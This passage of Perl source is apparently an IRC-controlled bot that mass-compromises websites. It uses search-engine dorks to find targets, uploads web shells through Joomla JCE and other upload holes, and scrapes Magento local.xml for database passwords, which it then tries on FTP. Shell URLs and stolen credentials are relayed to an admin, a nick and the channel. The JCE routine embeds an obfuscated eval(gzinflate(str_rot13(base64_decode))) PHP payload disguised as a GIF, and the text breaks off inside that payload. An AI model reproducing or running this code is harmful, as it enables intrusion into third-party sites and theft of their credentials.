	my $smtpluph = "http://".$site."includes/xmlrpc.php?x=spread"; 

	my $perl = "http://".$site."recky.php";

	my $php = "http://".$site."metri.php";

 	my $check = &get_content($xmlrpc."?x=spread"); &get_content($xmlrpc."?cpanel"); 

 	if ($check =~ /recky aka bogel/) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

 	&msg("$nick","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

 	&msg("$chan","$adslogo15,1[4@15$engine15][4@15SheLL15]9 Target Sent to 7*8 $nick 7* 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

 	&smtp($smtpluph,$chan,$site,$engine); 

 	} 

}

}



sub adsxp3() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $bulusukan."wew2.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	my $xmlrpc = "http://".$site."logs/xmlrpc.php"; 

	my $smtpluph = "http://".$site."logs/xmlrpc.php?x=spread"; 

	my $perl = "http://".$site."recky.php";

	my $php = "http://".$site."metri.php";

 	my $check = &get_content($xmlrpc."?x=spread"); &get_content($xmlrpc."?cpanel"); 

 	if ($check =~ /recky aka bogel/) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

 	&msg("$nick","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

 	&msg("$chan","$adslogo15,1[4@15$engine15][4@15SheLL15]9 Target Sent to 7*8 $nick 7* 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

 	&smtp($smtpluph,$chan,$site,$engine); 

 	} 

}

}



sub adsxp4() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $bulusukan."wew3.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	my $xmlrpc = "http://".$site."components/xmlrpc.php"; 

	my $smtpluph = "http://".$site."components/xmlrpc.php?x=spread"; 

	my $perl = "http://".$site."recky.php";

	my $php = "http://".$site."metri.php";

 	my $check = &get_content($xmlrpc."?x=spread"); &get_content($xmlrpc."?cpanel"); 

 	if ($check =~ /recky aka bogel/) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

 	&msg("$nick","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

 	&msg("$chan","$adslogo15,1[4@15$engine15][4@15SheLL15]9 Target Sent to 7*8 $nick 7* 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

 	&smtp($smtpluph,$chan,$site,$engine); 

 	} 

}

}



sub findx() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

	my $xXx = "http://".$site."tmp/plupload/index.php";

	my $xOx = "http://".$site."images/com_adsmanager/ads/uploaded/index.php";

	my $check = &get_content($xXx);

	my $check2 = &get_content($xOx); 

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$adslogo15,1[15@4$engine15][15@4SheLL15]9 $xXx 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$adslogo15,1[15@4$engine15][15@4SheLL15]9 $xXx 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$adslogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]"); 

} 

 	if ($check2 =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check2 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check2 =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check2 =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check2 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$adslogo15,1[15@4$engine15][15@4SheLL15]9 $xOx 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$adslogo15,1[15@4$engine15][15@4SheLL15]9 $xOx 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$adslogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]"); 

	} 

}

##

sub mag_exploit() {

	my $chan = $_[0];

	my $bug = $_[1];

	my $dork = $_[2];

	my $engine = $_[3];

	my $nick = $_[4];

	my $count = 0;

   	my @list = &search_engine($chan,$bug,$dork,$engine,$maglogo,$nick);

    	my $num = scalar(@list);

    	if ($num > 0){

    	foreach my $site(@list){

	$count++;

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

 		my $test = "http://".$site."/app/etc/local.xml"; 

		my $testi= "http://".$site."/magmi/web/plugin_upload.php";

 		my $teste= &get_content($testi); 

		my $html = &get_content($test); 

 		if ($html =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/i) { 

 		my $host = " "; 

 		if ($html =~ /<host><!\[\CDATA\[(.*)\]\]\><\/host>/) {$host=$1;} 

 		if ($html =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/){$user=$1;} 

 		if ($html =~ /<password><!\[CDATA\[(.*)\]\]\><\/password>/){$pass=$1;} 

 		if ($html =~ /<dbname><!\[CDATA\[(.*)\]\]\><\/dbname>/){$dbname=$1;} 

 		&msg("$chan","[15@4$engine15]11 From $maglogo to You .. =>9 http://".$site."   ");

		&msg("$chan","[15@4$engine15]11 http://".$site." [+]hostname:".$host." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."");

		#&msg("$chan","[15@4$engine15]4http://".$site." 11[+]hostname:11".$host."    ");

		#&msg("$chan","[15@4$engine15]4http://".$site." 11[+]username:11".$user."    ");

		#&msg("$chan","[15@4$engine15]4http://".$site." 11[+]password:11".$pass."    "); 

		#&msg("$chan","[15@4$engine15]4http://".$site." 11[+]dbname  :11".$dbname."  ");

		&magmi_xpl($teste,$chan,$site,$engine,$nick);

		&bogex2($html,$chan,$site,$engine,$nick);

 		if ($user =~ /_/) {@users = split("_", $user); $usr = $users[0];} 

 		my $ceklog = "ftp://".$usr.":".$pass."@".$site.""; 

 		my $ceklog2 = "ftp://".$user.":".$pass."@".$site.""; 

 		my $ftplog = &get_content($ceklog); 

 		my $ftplog2 = &get_content($ceklog2); 

 		if ($ftplog =~ /ftp/) { 

 		&msg("$admin","$maglogo15,1[4@15$engine15][4@15FTP15]9 ftp://".$site." 7login 3:9 ".$usr." 7|7 Pass 3:9 ".$pass.""); 

 		&msg("$nick","$maglogo15,1[4@15$engine15][4@15FTP15]9 ftp://".$site." 7login 3:9 ".$usr." 7|7 Pass 3:9 ".$pass.""); 

 		&msg("$chan","$maglogo15,1[4@15$engine15][4@15FTP15]9 PRIVATE FTP Sent to 7$nick "); 

 		} 

 		if ($ftplog2 =~ /ftp/) { 

 		&msg("$admin","$maglogo15,1[4@15$engine15][4@15FTP15]9 ftp://".$site." 7login 3:9 ".$user." 7|7 Pass 3:9 ".$pass.""); 

 		&msg("$nick","$maglogo15,1[4@15$engine15][4@15FTP15]9 ftp://".$site." 7login 3:9 ".$user." 7|7 Pass 3:9 ".$pass.""); 

 		&msg("$chan","$maglogo15,1[4@15$engine15][4@15FTP15]9 PRIVATE FTP Sent to 7$nick "); 

		#&ssh_connect($test,$host,$user,$pass,$chan,$engine,$nick);sleep(1);

 				} 

 			} 

 		} 

 	}

}

##



sub jce_exploit() {

	my $chan = $_[0];

	my $bug = $_[1];

	my $dork = $_[2];

	my $engine = $_[3];

	my $nick = $_[4];

	my $count = 0;

	my @list = &search_engine($chan,$bug,$dork,$engine,$jcelogo,$nick);

	my $num = scalar(@list);

	if ($num > 0){

    	foreach my $site(@list){

    	$count++;

    	if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

 		my $xmlrpc  = "http://".$site."tmp/bogel.php.1";

 		my $bot  = "http://".$site."tmp/metri.php";

 		my $box  = "http://".$site."tmp/recky.php";

 		my $smtpluph  = "http://".$site."tmp/bogel.php?db";

		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

		my $status = &jce_load($site); &jce_load($site); sleep(3);

		if ($status = 1) {

		my $check = &get_content($xmlrpc."?db"); 

		if ($check =~ /bogel - exploit/) {

		my $safe = "";

 		my $os   = "";

 		my $uid  = "";

		my $smtphost = "";

 		my $smtpuser = "";

 		my $smtppass = "";

		my $ftphost = "";

 		my $ftpuser = "";

 		my $ftppass = "";

		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

		if ($check =~ m/\$smtphost = '(.+?)';/i){$smtphost=$1;}

		if ($check =~ m/\$smtpport = '(.+?)';/i){$smtpport=$1;}

 		if ($check =~ m/\$smtpuser = '(.+?)';/i){$smtpuser=$1;}

		if ($check =~ m/\$smtppass = '(.+?)';/i){$smtppass=$1;}

		if ($check =~ m/\$ftp_host = '(.+?)';/i){$ftphost=$1;}

		if ($check =~ m/\$ftp_port = '(.+?)';/i){$ftpport=$1;}

		if ($check =~ m/\$ftp_user = '(.+?)';/i){$ftpuser=$1;}

		if ($check =~ m/\$ftp_pass = '(.+?)';/i){$ftppass=$1;}

		&msg("$chanx","$jcelogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

		&msg("$admin","$jcelogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

		&msg("$chan","$jcelogo15,1[4@15$engine15][4@15SheLL15]9 Target Sent to 7*8 $nick 7* 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

 		&bogex($smtpluph,$chan,$site,$engine); 

 		&smtp($smtpluph,$chan,$site,$engine); 

		if (defined($ftpuser)){

		&msg("$admin","15,1[7ftp15]7 $site7 $ftpuser $ftppass");

		}

		if (defined($smtpuser)){

		&msg("$admin","$jcelogo15,1[4@15$engine15][4@15SMTP15]7 $site14 -7 $smtphost 14|7 $smtpport 14|7 $smtpuser 14|7 $smtppass ");

			}

		}

	}

		} exit;

			}

		}

	}

}



sub jce_load() {

	my $success = 0;

	my $url = $_[0];

	   $url =~ s/http:\/\///;

	my $host = $url;

	my $chan = $url;

	   $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

	   $chan =~ s/(.*)\/[^\/]*$/\1/;

	   $chan .= "/";

	   $chan =~ s/([-a-zA-Z0-9\.]+)/$2/;

if ($chan eq "") { $chan = "/" }

$header1P = "POST ".$chan."index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1"; 

$header1P2 = "POST ".$chan."index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1"; 

$header2 = "Host: $host"; 

$header3 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"; 

$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334"; 

$header5 = "Content-Length: 50000"; 

$header6 = "-----------------------------41184676334"; 

$header7 = 'Content-Disposition: form-data; name="upload-dir"'; 

$header8 = '/'; 

$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""'; 

$header10 = 'Content-Type: application/octet-stream'; 

$header11 = 'Content-Disposition: form-data; name="upload-overwrite"'; 

$header12 = "0"; 

$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="bogel.gif"'; 

$header14 = 'Content-Type: image/gif'; 

$header15 = 'GIF89aG';

$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('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